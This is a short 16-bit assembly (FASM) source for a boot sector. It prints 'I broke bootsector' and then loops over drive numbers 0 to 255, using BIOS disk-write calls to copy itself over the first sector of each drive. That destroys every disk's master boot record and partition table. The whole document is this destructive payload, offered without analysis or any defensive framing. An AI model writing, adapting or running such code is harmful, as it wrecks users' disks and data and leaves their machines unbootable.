format binary
use16
org 7C00h

start:	mov ax, 3
	int 10h
	mov ax, 1301h
	mov cx, 18
	mov bp, msg
	xor dx, dx
	mov bx, 7
	int 10h
	xor ax, ax

.loop:	push ax
	xchg dl, al
	mov ax, 301h
	mov cx, 1
	xor dh, dh
	mov bx, start
	int 13h
	pop ax
	inc ax
	test al, al
	jnz .loop

	hlt

msg:	db "I broke bootsector"

MBR:	times 446-($-$$) db 0
	db 0x80
	db 0x0
	db 0x1
	db 0x0
	db 0x7f
	db 0
	db 1
	db 0x0
	dd 0x0
	dd 1
	times 48 db 0
	db 0x55, 0xAA
